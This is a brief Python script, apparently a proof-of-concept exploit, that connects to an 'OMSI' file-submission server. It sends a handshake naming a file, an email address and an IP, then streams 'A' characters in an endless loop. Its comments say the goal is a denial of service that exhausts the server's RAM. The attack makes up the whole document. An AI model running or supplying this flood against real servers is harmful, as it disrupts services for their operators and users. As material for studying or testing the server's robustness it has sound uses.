import socket

HOST = "<OMSI Server IP>"
PORT = <OMSI Server Port>

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

s.send("OMSI0001\x00bigfile.txt\x00me@ucdavis.edu\x0010.0.0.1")
data = s.recv(1024)
if data == 'ReadyToAcceptClientFile':
  #DoS the server by continaually sending data 
  #Because data is stored in RAM, the server
  #will eventually run out.
  while True:
     s.send("AAAAAAAAAA")
s.close()
